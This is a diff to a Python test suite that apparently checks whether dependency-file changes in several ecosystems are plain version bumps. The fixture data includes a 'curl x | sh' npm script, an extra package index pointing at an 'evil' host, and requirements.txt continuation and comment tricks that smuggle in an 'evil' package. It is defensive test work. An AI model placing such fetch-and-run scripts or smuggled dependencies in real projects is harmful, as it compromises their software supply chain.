@@ -134,6 +134,14 @@ class Fails(unittest.TestCase):
             ("package.json", '{"scripts": {"test": "vitest"}}', '{"scripts": {"test": "curl x | sh"}}', "scripts"),
             ("backend/requirements.txt", "fastapi==0.1\n", "fastapi==0.2\nrequests==2\n", "requests"),
             ("requirements-dev.txt", "pytest\n", "pytest\n--extra-index-url https://evil\n", "options"),
+            ("requirements.txt", "certifi==1 \\\n    --hash=sha256:aa\n",
+             "certifi==1 \\\n    --hash=sha256:aa\nevil==1 \\\n    --hash=sha256:ee\n", "evil"),
+            ("requirements.txt", "certifi==1 \\\n    --hash=sha256:aa\n",
+             "certifi==1 \\\n    --hash=sha256:aa\n# via requests \\\nevil==1 --hash=sha256:ee\n", "evil"),
+            ("requirements.txt", "certifi==1 \\\n    --hash=sha256:aa\n",
+             "certifi==1 \\\n    --hash=sha256:aa\n    # via requests \\\nevil==1 --hash=sha256:ee\n", "evil"),
+            ("requirements.txt", "certifi==1 \\\n    --hash=sha256:aa\n",
+             "certifi==1 \\\n    --hash=sha256:aa\ncertifi\\\n-evil==1 --hash=sha256:ee\n", "certifi-evil"),
             ("pyproject.toml", '[project]\ndependencies = ["fastapi>=0.1"]\n', '[project]\ndependencies = ["fastapi>=0.2", "httpx"]\n', "httpx"),
             ("go.mod", "module m\n\nrequire (\n\tgolang.org/x/net v0.1.0\n)\n", "module m\n\nrequire (\n\tgolang.org/x/net v0.2.0\n\tevil.com/x v1.0.0\n)\n", "evil.com/x"),
             ("pubspec.yaml", "dependencies:\n  flame: ^1.0.0\n", "dependencies:\n  flame: ^1.1.0\n  http: ^1.0.0\n", "http"),
@@ -144,6 +152,8 @@ class Fails(unittest.TestCase):
     def test_bumps_in_other_ecosystems_pass(self):
         for path, base, head in [
             ("requirements.txt", "fastapi==0.1\nPyYAML>=6\n", "fastapi==0.2\npyyaml>=6.0.2\n"),
+            ("requirements.txt", "certifi==1 \\\n    --hash=sha256:aa\n    # via requests\n",
+             "certifi==2 \\\n    --hash=sha256:bb \\\n    --hash=sha256:cc\n    # via requests\n"),
             ("go.mod", "module m\n\nrequire golang.org/x/net v0.1.0\n", "module m\n\nrequire golang.org/x/net v0.2.0\n"),
             ("pubspec.yaml", "dependencies:\n  flame: ^1.0.0\n", "dependencies:\n  flame: ^1.1.0\n"),
         ]:
